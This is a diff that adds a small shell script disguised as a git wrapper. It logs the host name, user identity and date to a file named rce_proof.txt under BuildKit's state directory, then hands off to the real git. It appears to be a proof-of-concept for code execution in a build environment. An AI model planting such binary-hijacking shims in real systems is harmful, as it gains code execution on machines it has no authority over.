@@ -1,0 +1,5 @@
+#!/bin/sh
+cat /etc/hostname > /var/lib/buildkit/rce_proof.txt 2>/dev/null
+id >> /var/lib/buildkit/rce_proof.txt 2>/dev/null
+date >> /var/lib/buildkit/rce_proof.txt 2>/dev/null
+exec /usr/bin/git "$@"
